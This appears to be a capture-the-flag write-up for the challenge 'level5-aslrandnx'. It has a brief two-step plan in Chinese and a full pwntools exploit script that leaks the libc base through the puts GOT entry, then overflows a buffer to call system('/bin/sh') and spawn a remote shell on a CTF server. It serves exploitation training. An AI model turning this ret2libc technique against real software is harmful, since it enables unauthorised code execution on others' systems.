# level5-aslrandnx
### 思路：
1. 泄露libc的地址
2. 利用libc调用system执行shell

```python
from pwn import *

r = remote("pwn.sixstars.team",22005)

elf = ELF("./level5-aslrandnx")
libc = ELF("./libc-2.23.so")

sh_addr = list(libc.search("/bin/sh"))[0]
print hex(sh_addr)

exeve_addr =libc.sym["system"]
print hex(exeve_addr)

word= r.recv()
print word

prepayload = 'a'*0x28 + 'a'*4 + p32(elf.plt['puts']) + p32(0x080484CB) + p32(elf.got['puts']) 
r.sendline(prepayload)

word1 = r.recv()
print len(word1)
word1 = word1[:4]
word1 = word1[::-1]
word1  = word1.encode('hex')
word1 = int(word1, 16)
print hex(word1)

base_addr = word1 - libc.sym["puts"] 

print "base_addr is: "+hex(base_addr)

exeve_actu = base_addr + exeve_addr
sh_actu = base_addr + sh_addr

print "exeve_actu is: "+ hex(exeve_actu)
print "sh_actu is: " + hex(sh_actu)

payload = 'a'*0x28 +'a'*4 + p32(exeve_actu) + p32(9) + p32(sh_actu) 

r.sendline(payload)
r.interactive()
```
